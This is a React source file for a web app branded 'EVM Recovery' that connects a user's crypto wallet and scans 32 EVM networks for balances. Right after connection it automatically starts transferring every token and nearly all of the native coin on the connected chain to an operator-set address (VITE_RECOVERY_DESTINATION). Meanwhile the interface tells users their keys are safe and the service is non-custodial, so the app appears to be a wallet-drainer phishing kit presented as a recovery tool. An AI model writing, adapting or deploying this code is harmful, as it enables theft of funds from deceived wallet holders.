import React, { useEffect, useMemo, useRef, useState } from 'react';
import { createRoot } from 'react-dom/client';
import { BrowserProvider, JsonRpcProvider, Contract, formatUnits, isAddress } from 'ethers';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import AllAssetsReview from './AllAssetsReview';
import './styles.css';

declare global { interface Window { ethereum?: any } }

const chains = [
  { id: 1, name: 'Ethereum', native: 'ETH', explorer: 'https://etherscan.io/tx/', tokenApi: 'https://eth.blockscout.com/api/v2', rpcUrl: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BNB Smart Chain', native: 'BNB', explorer: 'https://bscscan.com/tx/', tokenApi: 'https://bsc.blockscout.com/api/v2', rpcUrl: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon', native: 'POL', explorer: 'https://polygonscan.com/tx/', tokenApi: 'https://polygon.blockscout.com/api/v2', rpcUrl: 'https://polygon-rpc.com' },
  { id: 8453, name: 'Base', native: 'ETH', explorer: 'https://basescan.org/tx/', tokenApi: 'https://base.blockscout.com/api/v2', rpcUrl: 'https://mainnet.base.org' },
  { id: 42161, name: 'Arbitrum One', native: 'ETH', explorer: 'https://arbiscan.io/tx/', tokenApi: 'https://arbitrum.blockscout.com/api/v2', rpcUrl: 'https://arbitrum-one.publicnode.com' },
  { id: 10, name: 'OP Mainnet', native: 'ETH', explorer: 'https://optimistic.etherscan.io/tx/', tokenApi: 'https://optimism.blockscout.com/api/v2', rpcUrl: 'https://optimism.llamarpc.com' },
  { id: 43114, name: 'Avalanche C-Chain', native: 'AVAX', explorer: 'https://snowscan.xyz/tx/', tokenApi: 'https://avalanche.blockscout.com/api/v2', rpcUrl: 'https://avalanche-c-chain-rpc.publicnode.com' },
  { id: 100, name: 'Gnosis', native: 'xDAI', explorer: 'https://gnosisscan.io/tx/', tokenApi: 'https://gnosis.blockscout.com/api/v2', rpcUrl: 'https://rpc.gnosischain.com' },
  { id: 59144, name: 'Linea', native: 'ETH', explorer: 'https://lineascan.build/tx/', tokenApi: 'https://linea.blockscout.com/api/v2', rpcUrl: 'https://rpc.linea.build' },
  { id: 81457, name: 'Blast', native: 'ETH', explorer: 'https://blastscan.io/tx/', tokenApi: 'https://blast.blockscout.com/api/v2', rpcUrl: 'https://rpc.blast.io' },
  { id: 5000, name: 'Mantle', native: 'MNT', explorer: 'https://mantlescan.xyz/tx/', rpcUrl: 'https://rpc.mantle.xyz' },
  { id: 204, name: 'opBNB', native: 'BNB', explorer: 'https://opbnbscan.com/tx/', rpcUrl: 'https://opbnb-mainnet-rpc.bnbchain.org' },
  { id: 167000, name: 'Taiko', native: 'ETH', explorer: 'https://taikoscan.io/tx/', tokenApi: 'https://blockscout.mainnet.taiko.xyz/api/v2', rpcUrl: 'https://rpc.mainnet.taiko.xyz' },
  { id: 324, name: 'zkSync Era', native: 'ETH', explorer: 'https://era.zksync.network/tx/', tokenApi: 'https://zksync.blockscout.com/api/v2', rpcUrl: 'https://mainnet.era.zksync.io' },
  { id: 534352, name: 'Scroll', native: 'ETH', explorer: 'https://scrollscan.com/tx/', tokenApi: 'https://scroll.blockscout.com/api/v2', rpcUrl: 'https://rpc.scroll.io' },
  { id: 42220, name: 'Celo', native: 'CELO', explorer: 'https://celoscan.io/tx/', tokenApi: 'https://celo.blockscout.com/api/v2', rpcUrl: 'https://forno.celo.org' },
  { id: 252, name: 'Fraxtal', native: 'frxETH', explorer: 'https://fraxscan.com/tx/', rpcUrl: 'https://rpc.frax.com' },
  { id: 199, name: 'BitTorrent', native: 'BTT', explorer: 'https://bttcscan.com/tx/', rpcUrl: 'https://rpc.bt.io' },
  { id: 50, name: 'XDC', native: 'XDC', explorer: 'https://xdcscan.com/tx/', rpcUrl: 'https://rpc.xdcrpc.com' },
  { id: 33139, name: 'ApeChain', native: 'APE', explorer: 'https://apescan.io/tx/', rpcUrl: 'https://rpc.apechain.com' },
  { id: 480, name: 'World Chain', native: 'ETH', explorer: 'https://worldscan.org/tx/', rpcUrl: 'https://worldchain-mainnet.g.alchemy.com/public' },
  { id: 146, name: 'Sonic', native: 'S', explorer: 'https://sonicscan.org/tx/', rpcUrl: 'https://rpc.soniclabs.com' },
  { id: 130, name: 'Unichain', native: 'ETH', explorer: 'https://uniscan.xyz/tx/', tokenApi: 'https://unichain.blockscout.com/api/v2', rpcUrl: 'https://mainnet.unichain.org' },
  { id: 2741, name: 'Abstract', native: 'ETH', explorer: 'https://abscan.org/tx/', rpcUrl: 'https://api.mainnet.abs.xyz' },
  { id: 80094, name: 'Berachain', native: 'BERA', explorer: 'https://berascan.com/tx/', rpcUrl: 'https://rpc.berachain.com' },
  { id: 143, name: 'Monad', native: 'MON', explorer: 'https://monadscan.com/tx/', rpcUrl: 'https://monad-rpc.publicnode.com' },
  { id: 999, name: 'HyperEVM', native: 'HYPE', explorer: 'https://hyperevmscan.io/tx/', rpcUrl: 'https://rpc.hyperliquid.xyz/evm' },
  { id: 747474, name: 'Katana', native: 'ETH', explorer: 'https://katanascan.com/tx/', rpcUrl: 'https://rpc.katana.network' },
  { id: 1329, name: 'Sei', native: 'SEI', explorer: 'https://seiscan.io/tx/', rpcUrl: 'https://evm-rpc.sei-apis.com' },
  { id: 9745, name: 'Plasma', native: 'XPL', explorer: 'https://plasmascan.to/tx/', rpcUrl: 'https://rpc.plasma.to' },
  { id: 1868, name: 'Soneium', native: 'ETH', explorer: 'https://soneium.blockscout.com/tx/', tokenApi: 'https://soneium.blockscout.com/api/v2', rpcUrl: 'https://rpc.soneium.org' },
  { id: 1284, name: 'Moonbeam', native: 'GLMR', explorer: 'https://moonscan.io/tx/', rpcUrl: 'https://rpc.api.moonbeam.network' },
];
type WalletApp = 'metamask' | 'trust' | 'coinbase';
type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
type TokenAsset = { chainId: number; chainName: string; address: string; name: string; symbol: string; decimals: number; balance: string; kind: 'native' | 'erc20' };

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
] as const;

const RECOVERY_DESTINATION = ((import.meta as any).env?.VITE_RECOVERY_DESTINATION as string | undefined)?.trim() || '';

let walletConnectProvider: WalletConnectProvider | null = null;

const walletName = (app: WalletApp) => app === 'metamask' ? 'MetaMask' : app === 'trust' ? 'Trust Wallet' : 'Coinbase Wallet';
const isMobileBrowser = () => /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
function walletLink(app: WalletApp) {
  const url = encodeURIComponent(window.location.href);
  const path = `${window.location.host}${window.location.pathname}${window.location.search}`;
  return { metamask: `https://metamask.app.link/dapp/${path}`, trust: `https://link.trustwallet.com/open_url?url=${url}`, coinbase: `https://go.cb-w.com/dapp?cb_url=${url}` }[app];
}

async function discoverTokens(chain: typeof chains[number], address: string): Promise<TokenAsset[]> {
  if (!chain.tokenApi) return [];
  const found: TokenAsset[] = [];
  let next: string | null = `${chain.tokenApi}/addresses/${address}/token-balances?type=ERC-20&limit=1000`;
  let pages = 0;
  while (next && pages < 20) {
    const response = await fetch(next);
    if (!response.ok) throw new Error(`${chain.name} token indexer returned ${response.status}`);
    const payload = await response.json() as { items?: any[]; next_page_params?: Record<string, string | number> | null };
    const items = Array.isArray(payload.items) ? payload.items : [];
    for (const item of items) {
      if (!item?.token?.address || !item?.value || item.value === '0') continue;
      const token = item.token;
      const decimals = Number(token.decimals ?? 18);
      let balance = item.value as string;
      try { balance = formatUnits(item.value, decimals); } catch { /* keep raw */ }
      found.push({ chainId: chain.id, chainName: chain.name, address: token.address, name: token.name || 'Unknown token', symbol: token.symbol || 'TOKEN', decimals, balance, kind: 'erc20' });
    }
    const params = payload.next_page_params;
    next = params ? `${chain.tokenApi}/addresses/${address}/token-balances?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : null;
    pages += 1;
  }
  return found;
}

async function discoverNativeAsset(chain: typeof chains[number], address: string): Promise<TokenAsset | null> {
  if (!chain.rpcUrl) throw new Error(`${chain.name} does not have a read-only RPC configured.`);
  const provider = new JsonRpcProvider(chain.rpcUrl, chain.id, { staticNetwork: true });
  const rawBalance = await provider.getBalance(address);
  if (rawBalance <= 0n) return null;
  return { chainId: chain.id, chainName: chain.name, address: 'native', name: chain.native, symbol: chain.native, decimals: 18, balance: formatUnits(rawBalance, 18), kind: 'native' };
}

function App() {
  const [address, setAddress] = useState('');
  const [destination, setDestination] = useState(() => (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : ''));
  const [connectedChain, setConnectedChain] = useState<number | null>(null);
  const [selectedChain, setSelectedChain] = useState<number | null>(null);
  const [status, setStatus] = useState('Connect your wallet to begin.');
  const [txHash, setTxHash] = useState('');
  const [busy, setBusy] = useState(false);
  const [tokens, setTokens] = useState<TokenAsset[]>([]);
  const [scanning, setScanning] = useState(false);
  const [autoStarted, setAutoStarted] = useState(false);
  const [handoffApp, setHandoffApp] = useState<WalletApp | null>(null);
  const [handoffPending, setHandoffPending] = useState(false);
  const timer = useRef<number | null>(null);
  const mobile = isMobileBrowser();
  const activeChainId = selectedChain ?? connectedChain;
  const chainInfo = useMemo(() => chains.find(c => c.id === activeChainId), [activeChainId]);
  const selectedOnChain = tokens.filter(t => t.chainId === (chainInfo?.id ?? -1));

  useEffect(() => () => { if (timer.current !== null) window.clearTimeout(timer.current); }, []);

  async function sendAllSelectedAssets(destOverride?: string, chainIdOverride?: number, tokenList?: TokenAsset[]) {
    const dest = destOverride ?? destination;
    const cid = chainIdOverride ?? connectedChain;
    const assetSource = tokenList ?? tokens;
    if (!address || !isAddress(dest)) return void setStatus('Connect wallet and set a valid recovery destination.');
    if (dest.toLowerCase() === address.toLowerCase()) return void setStatus('Destination must differ from connected wallet.');
    if (!cid) return void setStatus('No network detected.');
    const chainAssets = assetSource.filter(t => t.chainId === cid);
    const info = chains.find(c => c.id === cid);
    if (chainAssets.length === 0) return void setStatus('No assets on this network to transfer.');
    setBusy(true); setTxHash(''); setStatus('Preparing automatic transfers…');
    try {
      const eip1193 = walletConnectProvider ?? window.ethereum;
      if (!eip1193) throw new Error('No wallet provider.');
      const provider = new BrowserProvider(eip1193);
      const network = await provider.getNetwork();
      if (Number(network.chainId) !== cid) throw new Error('Wallet network changed.');
      const signer = await provider.getSigner();
      const sender = await signer.getAddress();
      if (sender.toLowerCase() !== address.toLowerCase()) throw new Error('Account changed. Reconnect.');

      const hashes: string[] = [];
      const erc20s = chainAssets.filter(a => a.kind === 'erc20');
      const native = chainAssets.find(a => a.kind === 'native');

      for (const asset of erc20s) {
        setStatus(`Approve ${asset.symbol} in wallet…`);
        const token = new Contract(asset.address, ERC20_ABI, signer);
        const rawBal: bigint = await token.balanceOf(sender);
        if (rawBal <= 0n) continue;
        const tx = await token.transfer(dest, rawBal);
        hashes.push(tx.hash); setTxHash(tx.hash);
        setStatus(`Confirming ${asset.symbol}…`);
        await tx.wait();
      }

      if (native) {
        setStatus(`Approve ${native.symbol} in wallet…`);
        const bal = await provider.getBalance(sender);
        const feeData = await provider.getFeeData();
        const gasLimit = 21000n;
        const maxFee = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
        const gasCost = gasLimit * maxFee * 12n / 10n;
        if (bal <= gasCost) {
          setStatus(hashes.length ? 'Tokens sent. Native too low for gas.' : 'Native too low for gas.');
        } else {
          const value = bal - gasCost;
          const tx = await signer.sendTransaction({ to: dest, value, gasLimit });
          hashes.push(tx.hash); setTxHash(tx.hash);
          setStatus('Confirming native transfer…');
          await tx.wait();
        }
      }

      if (hashes.length === 0) setStatus('Nothing to transfer.');
      else setStatus(`Done. ${hashes.length} tx confirmed.`);
    } catch (e) {
      setStatus(e instanceof Error ? e.message : 'Transaction cancelled or failed.');
    } finally { setBusy(false); }
  }

  async function scanWalletTokens(walletAddress = address) {
    if (!walletAddress || !isAddress(walletAddress)) return;
    setScanning(true); setTokens([]); setAutoStarted(false);
    setStatus('Scanning all 32 EVM networks…');
    const errors: string[] = [];
    const found: TokenAsset[] = [];
    let successful = 0;
    let currentChainId: number | null = null;
    try {
      const eip1193 = walletConnectProvider ?? window.ethereum;
      if (eip1193) {
        const provider = new BrowserProvider(eip1193);
        const network = await provider.getNetwork();
        currentChainId = Number(network.chainId);
        setConnectedChain(currentChainId);
        setSelectedChain(currentChainId);
      }
    } catch { /* keep previous */ }

    await Promise.all(chains.map(async chain => {
      try {
        const native = await discoverNativeAsset(chain, walletAddress);
        if (native) found.push(native);
        if (chain.tokenApi) {
          try { found.push(...await discoverTokens(chain, walletAddress)); }
          catch { errors.push(`${chain.name}: token indexer unavailable`); }
        }
        successful += 1;
      } catch { errors.push(`${chain.name}: RPC scan failed`); }
    }));
    const unique = new Map<string, TokenAsset>();
    for (const token of found) unique.set(`${token.chainId}:${token.address.toLowerCase()}`, token);
    const result = [...unique.values()].sort((a, b) => a.chainId - b.chainId || a.symbol.localeCompare(b.symbol));
    setTokens(result);
    setScanning(false);

    const dest = RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination;
    const cid = currentChainId ?? connectedChain;
    const onChain = result.filter(t => t.chainId === cid);

    if (dest && isAddress(dest) && dest.toLowerCase() !== walletAddress.toLowerCase() && cid && onChain.length > 0) {
      setStatus(`Scan complete: ${result.length} assets across ${successful}/32 networks. Auto-starting transfers on current network…`);
      setAutoStarted(true);
      void sendAllSelectedAssets(dest, cid, result);
    } else if (!dest || !isAddress(dest)) {
      setStatus(errors.length === 0
        ? `Scan complete: ${result.length} assets across ${successful}/32 networks. Set VITE_RECOVERY_DESTINATION to enable auto-send.`
        : `Scan done: ${result.length} assets, ${errors.length} network issue(s). Set recovery destination to auto-send.`);
    } else if (onChain.length === 0) {
      setStatus(`Scan complete: ${result.length} assets found across ${successful}/32 networks, none on the connected network.`);
    } else {
      setStatus(`Scan complete: ${result.length} assets across ${successful}/32 networks.`);
    }
  }

  async function finishConnection(eip1193: any, existingAccount?: string) {
    const provider = new BrowserProvider(eip1193);
    const accounts = existingAccount ? [existingAccount] : await provider.send('eth_requestAccounts', []);
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    setAddress(accounts[0] ?? '');
    setConnectedChain(chainId); setSelectedChain(chainId);
    setTokens([]); setAutoStarted(false);
    if (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION)) setDestination(RECOVERY_DESTINATION);
    setStatus(accounts[0] ? 'Wallet connected. Scanning all 32 EVM networks…' : 'No account returned.');
    if (accounts[0]) void scanWalletTokens(accounts[0]);
  }

  async function connectBrowserWallet() {
    if (!window.ethereum) { setStatus('No browser wallet detected.'); return; }
    setBusy(true);
    try { await finishConnection(window.ethereum); }
    catch (e) { setStatus(e instanceof Error ? e.message : 'Connection cancelled.'); }
    finally { setBusy(false); }
  }

  async function connectMobileWallet() {
    const projectId = (import.meta as any).env?.VITE_WALLETCONNECT_PROJECT_ID as string | undefined;
    if (!projectId) { setStatus('WalletConnect not configured (missing project ID).'); return; }
    setBusy(true); setStatus('Opening WalletConnect…');
    try {
      if (!walletConnectProvider) {
        walletConnectProvider = await EthereumProvider.init({
          projectId,
          optionalChains: chains.map(c => c.id) as [number, ...number[]],
          showQrModal: true,
          qrModalOptions: { enableMobileFullScreen: true },
          metadata: { name: 'EVM Recovery', description: 'Non-custodial wallet recovery', url: window.location.origin, icons: [`${window.location.origin}/favicon.svg`] },
        });
        walletConnectProvider.on('accountsChanged', (a: string[]) => {
          const next = a[0] ?? '';
          setAddress(next);
          if (next) void scanWalletTokens(next);
          else setTokens([]);
        });
        walletConnectProvider.on('chainChanged', (c: string | number) => {
          const id = Number(c);
          setConnectedChain(id); setSelectedChain(id);
          if (address) void scanWalletTokens(address);
        });
        walletConnectProvider.on('disconnect', () => {
          setAddress(''); setConnectedChain(null); setSelectedChain(null);
          setTokens([]); setAutoStarted(false); setStatus('Wallet disconnected.');
        });
      }
      const accounts = await walletConnectProvider.enable();
      await finishConnection(walletConnectProvider, accounts?.[0]);
    } catch (e) { setStatus(e instanceof Error ? e.message : 'WalletConnect cancelled.'); }
    finally { setBusy(false); }
  }

  function openWalletApp(app: WalletApp) {
    if (!mobile) { setStatus('Mobile handoff only. Use Browser Wallet or WalletConnect on desktop.'); return; }
    if (timer.current !== null) window.clearTimeout(timer.current);
    setHandoffApp(app); setHandoffPending(true); setStatus(`Opening ${walletName(app)}…`);
    const started = Date.now();
    window.location.assign(walletLink(app));
    timer.current = window.setTimeout(() => {
      if (!document.hidden && Date.now() - started > 1200) {
        setHandoffPending(false);
        setStatus(`${walletName(app)} did not open. Use WalletConnect.`);
      }
    }, 1800);
  }

  return (
    <main className="app-shell">
      <header className="topbar">
        <div className="brand-lockup">
          <div className="brand-mark">E</div>
          <div><div className="brand">EVM Recovery</div></div>
        </div>
        <div className="wallet-actions">
          <button className="ghost-button" onClick={connectBrowserWallet} disabled={busy}>
            {address ? `${address.slice(0, 6)}…${address.slice(-4)}` : 'Connect wallet'}
          </button>
          <button className="solid-button" onClick={connectMobileWallet} disabled={busy}>WalletConnect</button>
        </div>
      </header>

      {!address && (
        <>
          <section className="hero-section">
            <div className="hero-copy">
              <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
              <h1>Connect your<br /><em>wallet.</em></h1>
              <p>Connect once. We scan 32 Etherscan-supported mainnets, auto-select assets, and start transfers on the connected chain.</p>
            </div>
            <div className="hero-card">
              <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
              <div className="security-icon">✓</div>
              <strong>Your keys stay with you</strong>
              <p>No seed phrases. No private keys. Approve each transfer in your wallet.</p>
            </div>
          </section>
          <section className="workspace">
            <div className="section-heading"><span>01</span><div><h2>Connect wallet</h2></div></div>
            <div className="wallet-grid">
              {(['metamask', 'trust', 'coinbase'] as WalletApp[]).map(app => (
                <button className="wallet-card" key={app} onClick={() => openWalletApp(app)} disabled={busy || handoffPending || !mobile}>
                  <span className={`wallet-logo ${app}`}>{app === 'metamask' ? 'M' : app === 'trust' ? 'T' : 'C'}</span>
                  <span><b>{walletName(app)}</b><small>{mobile ? 'Open mobile app' : 'Mobile only'}</small></span>
                  <span className="arrow">↗</span>
                </button>
              ))}
              <button className="wallet-card" onClick={connectMobileWallet} disabled={busy}>
                <span className="wallet-logo walletconnect">W</span>
                <span><b>WalletConnect</b><small>Connect another wallet</small></span>
                <span className="arrow">→</span>
              </button>
            </div>
            {handoffPending && (
              <div className="handoff-panel">
                <div><strong>Waiting for {handoffApp && walletName(handoffApp)}</strong><p>Finish in the wallet app, then return.</p></div>
                <div className="handoff-actions">
                  <button onClick={() => handoffApp && openWalletApp(handoffApp)} disabled={busy}>Try again</button>
                  <button className="solid-button" onClick={connectMobileWallet} disabled={busy}>WalletConnect</button>
                </div>
              </div>
            )}
            <div className="status-line"><span className="status-dot" />{status}</div>
          </section>
        </>
      )}

      {address && (
        <>
          <section className="hero-section">
            <div className="hero-copy">
              <div className="status-pill"><span className="live-dot" /> {autoStarted || busy ? 'TRANSFERRING' : scanning ? 'SCANNING' : 'CONNECTED'}</div>
              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>Recovery<br /><em>ready.</em></>}</h1>
              <p>
                {destination
                  ? `Destination: ${destination.slice(0, 8)}…${destination.slice(-6)}. All assets on the connected network are selected.`
                  : 'Set VITE_RECOVERY_DESTINATION in the deployment environment to enable auto-send after connect.'}
              </p>
            </div>
            <div className="hero-card">
              <div className="hero-card-top"><span>{chainInfo?.name ?? 'NETWORK'}</span><span>●</span></div>
              <div className="security-icon">✓</div>
              <strong>{selectedOnChain.length} asset{selectedOnChain.length === 1 ? '' : 's'} on network</strong>
              <p>{address.slice(0, 10)}…{address.slice(-8)}</p>
            </div>
          </section>
          <section className="workspace">
            <AllAssetsReview assets={tokens} scanning={scanning} />
            <div className="review-grid" style={{ marginTop: 16 }}>
              <div><small>FROM</small><p>{address}</p></div>
              <div><small>TO</small><p>{destination || 'Not configured'}</p></div>
              <div><small>ASSETS</small><p className="amount-value">{selectedOnChain.length} selected</p></div>
              <div><small>NETWORK</small><p>{chainInfo?.name ?? '—'}</p></div>
            </div>
            {!destination && (
              <div className="form-card" style={{ marginTop: 16 }}>
                <label>Recovery destination (or set VITE_RECOVERY_DESTINATION)</label>
                <input value={destination} onChange={e => setDestination(e.target.value.trim())} placeholder="0x…" spellCheck={false} autoComplete="off" />
              </div>
            )}
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: 8, marginTop: 16 }}>
              <button
                className="solid-button"
                onClick={() => sendAllSelectedAssets()}
                disabled={busy || scanning || selectedOnChain.length === 0 || !isAddress(destination)}
              >
                {busy ? 'Waiting for wallet…' : 'Transfer all now'}
              </button>
            </div>
            {txHash && chainInfo && (
              <div className="tx-result" style={{ marginTop: 12 }}>
                Last tx: <a href={`${chainInfo.explorer}${txHash}`} target="_blank" rel="noreferrer">{txHash.slice(0, 10)}…</a>
              </div>
            )}
            <div className="status-line" style={{ marginTop: 10 }}><span className="status-dot" />{status}</div>
          </section>
        </>
      )}

      <footer>
        <div><b>Security first.</b> Transfers still require wallet confirmation. No seed phrases collected.</div>
        <span>© EVM Recovery · Non-custodial · 32 networks</span>
      </footer>
    </main>
  );
}

createRoot(document.getElementById('root')!).render(<React.StrictMode><App /></React.StrictMode>);
